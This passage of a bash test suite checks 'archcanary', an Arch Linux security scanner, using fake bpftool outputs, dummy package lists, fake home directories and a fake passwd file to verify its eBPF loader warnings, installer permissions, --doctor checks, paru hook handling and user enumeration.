    # binary → WARNING naming the hook type, exit 1.
    local fake_bpftool_tp_unknown
    fake_bpftool_tp_unknown=$(mktemp)
    cat > "$fake_bpftool_tp_unknown" <<SCRIPT
#!/bin/sh
if [ "\$1" = "prog" ]; then
  cat <<PROGS
7: tracepoint  name watch_exec  tag abcdef1234567890  gpl
        loaded_at 2026-08-30T12:00:00+0200  uid 0
        xlated 200B  jited 200B  memlock 4096B
        pids test-loader($loader_pid)
PROGS
fi
SCRIPT
    chmod +x "$fake_bpftool_tp_unknown"
    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool_tp_unknown" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"stealth-associated program types present: tracepoint"* \
          && "$out" == *"test-loader"* ]]; then
        pass "check_bpftool: unknown tracepoint loader → WARNING (exit 1)"
    else
        fail "check_bpftool: unknown tracepoint loader → expected WARNING+exit1, got rc=$rc, out: $out"
    fi

    # Sub-test E: a tracepoint prog held by BOTH a pacman-owned and an unknown
    # process → WARNING, but the "Unknown loaders" line lists only the unresolved
    # one (regression guard: a resolved pacman-owned loader must not be labelled
    # unknown).
    local fake_bpftool_mixed unk_line
    fake_bpftool_mixed=$(mktemp)
    cat > "$fake_bpftool_mixed" <<SCRIPT
#!/bin/sh
if [ "\$1" = "prog" ]; then
  cat <<PROGS
7: tracepoint  name watch_exec  tag abcdef1234567890  gpl
        loaded_at 2026-08-30T12:00:00+0200  uid 0
        xlated 200B  jited 200B  memlock 4096B
        pids sleep($pac_pid),test-loader($loader_pid)
PROGS
fi
SCRIPT
    chmod +x "$fake_bpftool_mixed"
    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool_mixed" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    unk_line=$(grep 'Unknown loaders:' <<<"$out" || true)
    if [[ $rc -eq 1 && "$unk_line" == *"test-loader"* && "$unk_line" != *"sleep("* ]]; then
        pass "check_bpftool: WARNING 'Unknown loaders' excludes resolved pacman-owned loaders"
    else
        fail "check_bpftool: mixed loaders → expected only the unknown one listed, got rc=$rc line: $unk_line"
    fi

    kill "$loader_pid" "$pac_pid" 2>/dev/null || true
    wait "$loader_pid" "$pac_pid" 2>/dev/null || true
    rm -f "$fake_bpftool" "$allow_file" "$fake_bpftool_tp" "$fake_bpftool_tp_unknown" "$fake_bpftool_mixed"
    rm -rf "$tmpdir"
}

# ---------------------------------------------------------------------------
# Test 15: _bundled_list_path falls back to the system-lib dir when the
#          running script has no bundled data files next to it (the
#          /usr/bin/archcanary packaged layout — only /usr/lib/archcanary/
#          carries the bundled lists, not /usr/bin/).
# ---------------------------------------------------------------------------
test_bundled_list_path_usr_bin_layout() {
    local isolated_bin sys_lib fake_home
    isolated_bin=$(mktemp -d)
    sys_lib=$(mktemp -d)
    fake_home=$(mktemp -d)

    cp "$REPO_DIR/archcanary.sh" "$isolated_bin/archcanary.sh"
    chmod +x "$isolated_bin/archcanary.sh"
    cp "$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" "$sys_lib/malicious_npm_packages.txt"

    local out rc=0
    out=$(HOME="$fake_home" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYSTEM_LIB="$sys_lib" \
        "$isolated_bin/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --no-notify 2>&1) || rc=$?

    if [[ "$out" == *"Packages checked:"* && "$out" != *"Malicious npm package list not found"* ]]; then
        pass "bundled_list_path: /usr/bin-style layout resolves npm list via system-lib fallback"
    else
        fail "bundled_list_path: expected fallback resolution to succeed, got: $out"
    fi

    rm -rf "$isolated_bin" "$sys_lib" "$fake_home"
}

# ---------------------------------------------------------------------------
# lib/archcanary-root-install.sh's bundled-list seeding loop must leave
# /usr/lib/archcanary/*.txt world-readable regardless of root's umask at
# install time. Regression coverage for a real bug: plain `cp` (no explicit
# mode) inherits the invoking (root) shell's umask, and a restrictive umask
# (0027, reported live) left these files 640 root:root -- unreadable by any
# non-root user, breaking _bundled_list_path's system-lib fallback for every
# local user but root. This only exercises the seeding loop itself (safe to
# run unprivileged against a temp dir) -- not the rest of the root-only
# installer, which needs real root and isn't run by this suite.
# ---------------------------------------------------------------------------
test_root_install_bundled_lists_world_readable() {
    local fake_repo fake_lib snippet f mode
    fake_repo=$(mktemp -d)
    fake_lib=$(mktemp -d)
    mkdir -p "$fake_repo/lists"
    for f in package_list.txt malicious_npm_packages.txt chaos_rat_packages.txt \
             malicious_russian_spam_packages.txt community_reports.txt; do
        echo "dummy" > "$fake_repo/lists/$f"
    done

    snippet=$(sed -n '/^    for _list in package_list\.txt/,/^    done$/p' \
        "$REPO_DIR/lib/archcanary-root-install.sh")

    ( umask 0027
      REPO_DIR="$fake_repo" SYSTEM_LIB="$fake_lib"
      eval "$snippet" )

    local bad=()
    for f in package_list.txt malicious_npm_packages.txt chaos_rat_packages.txt \
             malicious_russian_spam_packages.txt community_reports.txt; do
        mode=$(stat -c '%a' "$fake_lib/$f" 2>/dev/null)
        [[ "$mode" == "644" ]] || bad+=("$f:${mode:-missing}")
    done

    if [[ ${#bad[@]} -eq 0 ]]; then
        pass "root_install: bundled list files are 644 regardless of umask at install time"
    else
        fail "root_install: expected 644 on all bundled lists, got: ${bad[*]}"
    fi

    rm -rf "$fake_repo" "$fake_lib"
}

# ---------------------------------------------------------------------------
# RESULT banner wording — regression coverage for a real report: a scan
# where every check that ran was clean, and the only reason for a non-zero
# exit code was an optional/root-only check being skipped, still printed
# the same "RESULT: WARNINGS" banner as a genuine finding. Confusingly
# alarming for what amounts to "nothing wrong, just incomplete."
# ---------------------------------------------------------------------------
test_result_banner_skip_only_wording() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --no-notify --color=never
    )
    local out rc=0

    # Sub-test A: nothing found, but a check was skipped (needs root) —
    # banner must say CLEAN (INCOMPLETE), not WARNINGS.
    rc=0
    out=$("$REPO_DIR/archcanary.sh" "${base_args[@]}" --check-lynis 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"RESULT: CLEAN (INCOMPLETE)"* && "$out" != *"RESULT: WARNINGS"* ]]; then
        pass "result_banner: skip-only exit 1 shows CLEAN (INCOMPLETE), not WARNINGS"
    else
        fail "result_banner: expected CLEAN (INCOMPLETE) wording, rc=$rc, out: $out"
    fi

    # Sub-test B: a real code-1 finding (unknown bpftool LSM loader) must
    # still say WARNINGS — the softer wording must not mask an actual hit.
    local tmpdir loader_bin loader_pid fake_bpftool
    tmpdir=$(mktemp -d)
    loader_bin="$tmpdir/test-loader"
    cp "$(command -v sleep)" "$loader_bin"
    "$loader_bin" 30 &
    loader_pid=$!
    sleep 0.3
    fake_bpftool=$(mktemp)
    cat > "$fake_bpftool" <<SCRIPT
#!/bin/sh
if [ "\$1" = "prog" ]; then
  cat <<PROGS
5: lsm  name my_hook  tag 1234567890abcdef  gpl
        loaded_at 2026-07-03T12:00:00+0200  uid 0
        xlated 100B  jited 100B  memlock 4096B
        pids test-loader($loader_pid)
PROGS
fi
SCRIPT
    chmod +x "$fake_bpftool"

    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --check-bpftool 2>&1) || rc=$?
    kill "$loader_pid" 2>/dev/null || true
    rm -rf "$tmpdir" "$fake_bpftool"
    if [[ $rc -eq 1 && "$out" == *"RESULT: WARNINGS"* && "$out" != *"CLEAN (INCOMPLETE)"* ]]; then
        pass "result_banner: real code-1 finding still shows WARNINGS"
    else
        fail "result_banner: real finding should still say WARNINGS, rc=$rc, out: $out"
    fi

    # Sub-test C: lynis pulled in only via --full (never asked for directly)
    # and not installed — must not appear in the "optional check(s) skipped"
    # line. Root-only checks (bpftool/kmod, also enabled by --full) still make
    # the scan INCOMPLETE on their own; the point here is specifically that
    # lynis's absence doesn't also get blamed.
    rc=0
    out=$("$REPO_DIR/archcanary.sh" "${base_args[@]}" --full 2>&1) || rc=$?
    if [[ "$out" != *"optional check(s) skipped"*"lynis"* ]]; then
        pass "result_banner: --full doesn't blame missing lynis unless --check-lynis was explicit"
    else
        fail "result_banner: lynis should not appear in optional-skip line under bare --full, out: $out"
    fi
}

# ---------------------------------------------------------------------------
# --doctor: stale user-level bash completion silently shadowing a correct
# system-level one — reported live (bash's dynamic loader checks the user
# completions dir first, so a plain install done once and never repeated
# after switching to --system/package installs leaves the wrong flags
# completing forever, with no obvious symptom).
# ---------------------------------------------------------------------------
test_doctor_stale_completion() {
    local fake_home out
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.local/share/bash-completion/completions" "$fake_home/.config/archcanary"

    local sys_completion
    sys_completion=$(mktemp)
    printf 'system version content\n' > "$sys_completion"

    # Sub-test A: user copy differs from system copy → WARN with the exact
    # fix command.
    printf 'stale user version content\n' > "$fake_home/.local/share/bash-completion/completions/archcanary"
    out=$(HOME="$fake_home" XDG_DATA_HOME="$fake_home/.local/share" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYS_COMPLETION="$sys_completion" \
        "$REPO_DIR/archcanary.sh" --doctor=user 2>&1) || true
    if [[ "$out" == *"bash completion (user copy differs from system copy)"* && "$out" == *"install.sh"* ]]; then
        pass "doctor: stale user completion copy detected, fix hint present"
    else
        fail "doctor: expected stale-completion WARN, out: $out"
    fi

    # Sub-test B: user copy matches system copy → no warning.
    cp "$sys_completion" "$fake_home/.local/share/bash-completion/completions/archcanary"
    out=$(HOME="$fake_home" XDG_DATA_HOME="$fake_home/.local/share" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYS_COMPLETION="$sys_completion" \
        "$REPO_DIR/archcanary.sh" --doctor=user 2>&1) || true
    if [[ "$out" != *"bash completion"* ]]; then
        pass "doctor: matching completion copies → no false positive"
    else
        fail "doctor: in-sync completion copies should not warn, out: $out"
    fi

    # Sub-test C: only the user copy exists (plain install, no --system ever
    # run) → nothing to shadow, no warning.
    out=$(HOME="$fake_home" XDG_DATA_HOME="$fake_home/.local/share" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYS_COMPLETION="/nonexistent-sys-completion-xyz" \
        "$REPO_DIR/archcanary.sh" --doctor=user 2>&1) || true
    if [[ "$out" != *"bash completion"* ]]; then
        pass "doctor: user-only install (no system copy) → no false positive"
    else
        fail "doctor: user-only completion copy should not warn, out: $out"
    fi

    rm -rf "$fake_home"
    rm -f "$sys_completion"
}

# ---------------------------------------------------------------------------
# --doctor's yay init.lua staleness check — regression coverage for the same
# drift class as test_doctor_stale_completion, but for
# ~/.config/yay/init.lua. install.sh never overwrites an existing init.lua
# (see docs/my-setup.md, "yay 13.0 integration"), so a user who adopted the
# hooks before a later archcanary release changed them would otherwise never
# be told their copy is behind.
# ---------------------------------------------------------------------------
test_doctor_stale_yay_init() {
    local fake_home out

    # Sub-test A: current version marker present -> OK, no warning.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/yay"
    cp "$REPO_DIR/configs/yay-init.lua" "$fake_home/.config/yay/init.lua"
    out=$(XDG_CONFIG_HOME="$fake_home/.config" "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"[ OK ]  yay init.lua"* && "$out" != *"outdated"* ]]; then
        pass "doctor: current yay init.lua marker -> OK, no false positive"
    else
        fail "doctor: expected OK for current yay init.lua, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test B: an older, unversioned marker (pre-(vN) convention) -> WARN
    # with the exact re-copy fix command.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/yay"
    sed -E 's/ \(v[0-9]+\)\.$/./' "$REPO_DIR/configs/yay-init.lua" > "$fake_home/.config/yay/init.lua"
    out=$(XDG_CONFIG_HOME="$fake_home/.config" "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"yay init.lua"*"(outdated)"* && "$out" == *"cp "*"configs/yay-init.lua"* ]]; then
        pass "doctor: outdated yay init.lua marker -> WARN with fix hint"
    else
        fail "doctor: expected outdated-yay-init WARN, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test C: no init.lua at all (not a yay user, or never adopted the
    # hooks) -> optional, not a failure.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config"
    out=$(XDG_CONFIG_HOME="$fake_home/.config" "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"[OPT ]  yay init.lua"* ]]; then
        pass "doctor: missing yay init.lua -> optional, no false positive"
    else
        fail "doctor: expected OPT for missing yay init.lua, out: $out"
    fi
    rm -rf "$fake_home"
}

# ---------------------------------------------------------------------------
# test_doctor_stale_paru_hook — same three-state marker check as yay's
# init.lua, but for paru's PreBuildCommand hook, plus a 4th sub-test
# confirming the check only appears when `paru` is actually on $PATH (it
# edits a config file paru itself may already use for other settings, so
# unlike yay's unconditional check, this one is gated on `command -v paru`).
# ---------------------------------------------------------------------------
test_doctor_stale_paru_hook() {
    local fake_home fake_bin out

    # Fabricate a minimal `paru` on $PATH so `command -v paru` succeeds —
    # the doctor check never actually invokes it, just checks presence.
    fake_bin=$(mktemp -d)
    printf '#!/bin/sh\nexit 0\n' > "$fake_bin/paru"
    chmod +x "$fake_bin/paru"

    # Sub-test A: current version marker present -> OK, no warning.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/paru"
    cp "$REPO_DIR/configs/paru-hook.conf" "$fake_home/.config/paru/paru.conf"
    out=$(PATH="$fake_bin:$PATH" XDG_CONFIG_HOME="$fake_home/.config" \
        "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"[ OK ]  paru PreBuildCommand hook"* && "$out" != *"outdated"* ]]; then
        pass "doctor: current paru hook marker -> OK, no false positive"
    else
        fail "doctor: expected OK for current paru hook, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test B: an older marker (no version suffix) -> WARN with a manual
    # fix pointer (never a `cp`, unlike yay — paru.conf is a shared file).
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/paru"
    sed 's/ (v1)//' "$REPO_DIR/configs/paru-hook.conf" > "$fake_home/.config/paru/paru.conf"
    out=$(PATH="$fake_bin:$PATH" XDG_CONFIG_HOME="$fake_home/.config" \
        "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"paru PreBuildCommand hook"*"(outdated)"* && \
          "$out" == *"edit "*"paru.conf"*"by hand"* ]]; then
        pass "doctor: outdated paru hook marker -> WARN with manual-edit hint"
    else
        fail "doctor: expected outdated-paru-hook WARN, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test C: paru installed, but no paru.conf at all -> optional.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config"
    out=$(PATH="$fake_bin:$PATH" XDG_CONFIG_HOME="$fake_home/.config" \
        "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"[OPT ]  paru PreBuildCommand hook"* ]]; then
        pass "doctor: paru installed, no paru.conf -> optional, no false positive"
    else
        fail "doctor: expected OPT for missing paru.conf, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test D: paru NOT on $PATH, even with a current paru.conf present ->
    # the check doesn't appear at all. Validates the `command -v paru` gate.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/paru"
    cp "$REPO_DIR/configs/paru-hook.conf" "$fake_home/.config/paru/paru.conf"
    out=$(XDG_CONFIG_HOME="$fake_home/.config" \
        "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" != *"paru PreBuildCommand hook"* ]]; then
        pass "doctor: paru not on \$PATH -> paru hook check omitted entirely"
    else
        fail "doctor: paru hook check should be gated on command -v paru, out: $out"
    fi
    rm -rf "$fake_home"

    rm -rf "$fake_bin"
}

# ---------------------------------------------------------------------------
# test_install_paru_conf — exercises the real paru-seeding/uninstall logic
# lifted straight out of install.sh (not a hand-copied duplicate, to avoid
# drift), run in isolation. Deliberately does NOT invoke install.sh itself:
# on a machine with a real system-wide install (a genuine, common state —
# hit live while developing this), install.sh's binary-install step checks
# the literal, non-overridable path /usr/local/bin and shells out to sudo to
# clean up a competing copy if one exists there. That's correct behavior for
# a real install, but it means running install.sh end-to-end in a test can
# reach for sudo against real system state — never safe to do from a test
# suite. Extracting just the two paru-specific blocks below sidesteps that
# entirely: neither one touches anything outside the fake $HOME.
# ---------------------------------------------------------------------------
_extract_paru_seed_block() {
    awk '
        found { print; if ($0 == "fi") exit }
        !found && index($0, "if command -v paru >/dev/null 2>&1; then") { found=1; print }
    ' "$REPO_DIR/install.sh"
}
_extract_paru_uninstall_block() {
    awk '
        found { print; if ($0 == "    fi") exit }
        !found && index($0, "PARU_CONF=\"${XDG_CONFIG_HOME:-$HOME/.config}/paru/paru.conf\"") { found=1; print }
    ' "$REPO_DIR/install.sh"
}

test_install_paru_conf() {
    local fake_bin fake_home out seed_block uninstall_block

    seed_block=$(_extract_paru_seed_block)
    uninstall_block=$(_extract_paru_uninstall_block)
    if [[ -z "$seed_block" || -z "$uninstall_block" ]]; then
        fail "install_paru_conf: could not extract paru blocks from install.sh (anchors drifted?)"
        return
    fi

    fake_bin=$(mktemp -d)
    printf '#!/bin/sh\nexit 0\n' > "$fake_bin/paru"
    chmod +x "$fake_bin/paru"

    # Sub-test A: fresh install, no pre-existing paru.conf -> file created
    # with our marked block.
    fake_home=$(mktemp -d)
    out=$(HOME="$fake_home" PATH="$fake_bin:$PATH" REPO_DIR="$REPO_DIR" bash -c "$seed_block" 2>&1)
    if [[ "$out" == *"seeded:"* ]] && \
       diff -q "$fake_home/.config/paru/paru.conf" "$REPO_DIR/configs/paru-hook.conf" >/dev/null 2>&1; then
        pass "install: fresh paru.conf seeded with archcanary's hook block"
    else
        fail "install: fresh paru.conf seed failed, out: $out"
    fi

    # Sub-test B: re-run against the now-seeded file -> idempotent, "kept",
    # file byte-for-byte unchanged (no double-append).
    local before_sum after_sum
    before_sum=$(md5sum "$fake_home/.config/paru/paru.conf" | cut -d' ' -f1)
    out=$(HOME="$fake_home" PATH="$fake_bin:$PATH" REPO_DIR="$REPO_DIR" bash -c "$seed_block" 2>&1)
    after_sum=$(md5sum "$fake_home/.config/paru/paru.conf" | cut -d' ' -f1)
    if [[ "$out" == *"kept:"* && "$before_sum" == "$after_sum" ]]; then
        pass "install: re-running seed is idempotent (kept, unchanged)"
    else
        fail "install: re-run should be idempotent, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test C: pre-existing paru.conf with the user's OWN unrelated
    # PreBuildCommand and other settings -> must be left completely
    # untouched, not clobbered or appended to.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/paru"
    cat > "$fake_home/.config/paru/paru.conf" << 'EOF'
[options]
BottomUp

[bin]
PreBuildCommand = echo my own custom hook
EOF
    before_sum=$(md5sum "$fake_home/.config/paru/paru.conf" | cut -d' ' -f1)
    out=$(HOME="$fake_home" PATH="$fake_bin:$PATH" REPO_DIR="$REPO_DIR" bash -c "$seed_block" 2>&1)
    after_sum=$(md5sum "$fake_home/.config/paru/paru.conf" | cut -d' ' -f1)
    if [[ "$out" == *"kept:"* && "$before_sum" == "$after_sum" ]]; then
        pass "install: pre-existing user PreBuildCommand is never touched"
    else
        fail "install: user's own PreBuildCommand should be untouched, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test D: uninstall removes exactly our two marked lines, leaves the
    # [bin] header and unrelated surrounding content in place.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/paru"
    cat > "$fake_home/.config/paru/paru.conf" << 'EOF'
[options]
BottomUp

[bin]
FileManager = nnn
# archcanary PreBuildCommand hook (v1) — see docs/my-setup.md, "paru integration"
PreBuildCommand = ! command -v archcanary >/dev/null 2>&1 || PKGBUILD_CACHE_DIRS=. archcanary --check-pkgbuild --no-notify --no-summary
EOF
    HOME="$fake_home" bash -c "$uninstall_block" >/dev/null 2>&1
    if ! grep -q "archcanary PreBuildCommand hook" "$fake_home/.config/paru/paru.conf" && \
       grep -q "^\[bin\]$" "$fake_home/.config/paru/paru.conf" && \
       grep -q "^FileManager = nnn$" "$fake_home/.config/paru/paru.conf" && \
       grep -q "^BottomUp$" "$fake_home/.config/paru/paru.conf"; then
        pass "install: uninstall removes only the marked hook lines, keeps rest of file"
    else
        fail "install: uninstall should surgically remove only our 2 lines, got: $(cat "$fake_home/.config/paru/paru.conf")"
    fi
    rm -rf "$fake_home"

    rm -rf "$fake_bin"
}

# ---------------------------------------------------------------------------
# test_color_flag_validation — regression guard: --color used to silently
# accept any value (falling through the case statement to colorless output)
# instead of erroring like --format already does. Reported live: --color=
# a hex code like #CAD451 produced no error, just silently disabled color.
# ---------------------------------------------------------------------------
test_color_flag_validation() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --no-notify --no-summary
    )
    local out rc=0

    out=$("$REPO_DIR/archcanary.sh" "${base_args[@]}" --color='#CAD451' 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"Error: --color must be 'auto', 'always', or 'never'"*"#CAD451"* ]]; then
        pass "color_flag: invalid value rejected with exit 1 and clear error"
    else
        fail "color_flag: expected rejection of invalid value, rc=$rc, out: $out"
    fi

    for v in auto always never; do
        rc=0
        out=$("$REPO_DIR/archcanary.sh" "${base_args[@]}" --color="$v" 2>&1) || rc=$?
        if [[ "$out" != *"Error: --color must be"* ]]; then
            pass "color_flag: valid value '$v' accepted"
        else
            fail "color_flag: valid value '$v' incorrectly rejected, out: $out"
        fi
    done
}

# ---------------------------------------------------------------------------
# --scan-all-homes. _enumerate_local_users and _run_scan_all_homes are only
# ever reached past archcanary.sh's own `[[ $EUID -eq 0 ]]` guard for this
# flag, and this suite never runs as real root (never safe to do from a
# test — see the policy note elsewhere in this file) — so those two are
# tested by extracting just the function definitions via sed and sourcing
# them directly, bypassing the CLI/root-guard entirely. The root guard
# itself and the --full exclusion don't need that: they're testable through
# the real CLI as a normal non-root user.
# ---------------------------------------------------------------------------
_sah_extract_fns() {
    sed -n '/^_enumerate_local_users()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_resolve_scan_user_opts()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_SAH_PER_USER_CHECK_NAMES=(/,/^_run_scan_all_homes()/{ /^_run_scan_all_homes()/!p }' "$REPO_DIR/archcanary.sh"
    sed -n '/^_run_scan_all_homes()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_resolve_and_store_scan_users()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_sah_parse_checks()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_sah_status_to_code()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_is_behavior_check_name()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_print_summary_row()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_print_summary()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_is_sah_per_user_check()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_print_summary_general_only()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_print_sah_per_user_checks()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_print_sah_section_header()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_print_scan_summary_section()/,/^}/p' "$REPO_DIR/archcanary.sh"
    sed -n '/^_warn_scan_homes_flag_interactions()/,/^}/p' "$REPO_DIR/archcanary.sh"
}

test_enumerate_local_users() {
    local fns scratch fake_passwd
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
    mkdir -p "$scratch/alice" "$scratch/bob" "$scratch/carol"
    # nohome deliberately not created — the home-dir-exists filter must
    # exclude it.
    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
root:x:0:0::/root:/bin/bash
daemon:x:1:1::/usr/bin:/usr/bin/nologin
service:x:900:900::/var/lib/service:/usr/bin/nologin
alice:x:1000:1000::$scratch/alice:/bin/bash
bob:x:1001:1001::$scratch/bob:/bin/zsh
carol:x:1002:1002::$scratch/carol:/usr/bin/nologin
nohome:x:1003:1003::$scratch/nohome:/bin/bash
EOF

    local out
    out=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        _enumerate_local_users users
        printf '%s\n' \"\${users[@]}\"
    ")
    if [[ "$out" == *"alice:$scratch/alice"* && "$out" == *"bob:$scratch/bob"* && \
          "$out" != *"root:"* && "$out" != *"daemon:"* && "$out" != *"service:"* && \
          "$out" != *"carol:"* && "$out" != *"nohome:"* ]]; then
        pass "enumerate_local_users: UID range, nologin/false shell, and missing-home filters all apply"
    else
        fail "enumerate_local_users: unexpected user set, out: $out"
    fi

    local out2
    out2=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        SCAN_ALL_HOMES_EXCLUDE='bob'
        _enumerate_local_users users
        printf '%s\n' \"\${users[@]}\"
    ")
    if [[ "$out2" == *"alice:"* && "$out2" != *"bob:"* ]]; then
        pass "enumerate_local_users: SCAN_ALL_HOMES_EXCLUDE skips the named user"
    else
        fail "enumerate_local_users: exclude list not respected, out: $out2"
    fi

    rm -f "$fns"
    rm -rf "$scratch"
}

test_resolve_scan_user_opts() {
    local fns scratch fake_passwd
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
    mkdir -p "$scratch/alice" "$scratch/bob"
    # nohome deliberately not created -- a named user with no home dir must
    # be a hard error here (unlike enumeration, which just silently drops it).

    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
alice:x:1000:1000::$scratch/alice:/bin/bash
bob:x:1001:1001::$scratch/bob:/bin/zsh
nohome:x:1002:1002::$scratch/nohome:/bin/bash
EOF

    local out rc=0
    out=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        SCAN_USER_OPTS=(bob alice bob)
        _resolve_scan_user_opts users
        printf '%s\n' \"\${users[@]}\"
    " 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == "bob:$scratch/bob"$'\n'"alice:$scratch/alice" ]]; then
        pass "resolve_scan_user_opts: repeatable, order-preserving, de-duped"
    else
        fail "resolve_scan_user_opts: expected bob then alice, deduped, rc=$rc, out: $out"
    fi

    rc=0
    out=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        SCAN_USER_OPTS=(ghost)
        _resolve_scan_user_opts users
    " 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"'ghost' is not a known local user"* ]]; then
        pass "resolve_scan_user_opts: unknown username is a hard error"
    else
        fail "resolve_scan_user_opts: expected unknown-user error, rc=$rc, out: $out"
    fi

    rc=0
    out=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        SCAN_USER_OPTS=(nohome)
        _resolve_scan_user_opts users
    " 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"'nohome' has no home directory"* ]]; then
        pass "resolve_scan_user_opts: known user with no home dir is a hard error"
    else
        fail "resolve_scan_user_opts: expected no-home-dir error, rc=$rc, out: $out"
    fi

    # Regression: a failing `getent passwd NAME` (not just an ordinary "not
    # found") must not silently kill the whole script under set -e --
    # /code-review found the original bulk `getent passwd | awk ...` did
    # exactly that whenever getent itself failed (e.g. sssd's
    # `enumerate = false`, common on LDAP/AD-joined systems, refuses bulk
    # listing while still answering targeted lookups -- which is also why
    # the fix switched to a targeted `getent passwd NAME` call). Reproduced
    # directly: a fake `getent` that exits nonzero with no output, WITHOUT
    # the test-seam env var (so the real getent-calling branch runs), under
    # explicit `set -e` in the test shell itself -- the extracted function
    # snippet doesn't carry the real script's own `set -euo pipefail`.
    local fake_bin
    fake_bin=$(mktemp -d)
    cat > "$fake_bin/getent" <<'EOF'
#!/usr/bin/env bash
exit 2
EOF
    chmod +x "$fake_bin/getent"
    rc=0
    out=$(PATH="$fake_bin:$PATH" bash -c "
        set -euo pipefail
        source '$fns'
        SCAN_USER_OPTS=(alice)
        _resolve_scan_user_opts users
        echo 'UNREACHABLE ON FAILURE'
    " 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"'alice' is not a known local user"* && \
          "$out" != *UNREACHABLE* ]]; then
        pass "resolve_scan_user_opts: a failing getent reports the normal error instead of silently killing the script"
    else
        fail "resolve_scan_user_opts: expected clean error on getent failure (not a silent set -e death), rc=$rc, out: $out"
    fi
    rm -rf "$fake_bin"

    rm -f "$fns"
    rm -rf "$scratch"
}

# ---------------------------------------------------------------------------
# _resolve_and_store_scan_users (the early, pre-log-redirect validation step
# /code-review found missing -- previously a --scan-user typo wasn't caught
# until deep inside _run_scan_all_homes, after other requested checks had
# already run and, in --format=json mode, after the log-only redirect, so a
# JSON caller's actual stdout was completely empty on error). Must populate
# _SAH_RESOLVED_USERS for valid names, leave it empty (no error) when
# SCAN_USER_OPTS is empty (the --scan-all-homes / normal-scan case), and
# propagate _resolve_scan_user_opts's hard error for an invalid name.
# ---------------------------------------------------------------------------
test_resolve_and_store_scan_users() {
    local fns scratch fake_passwd
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
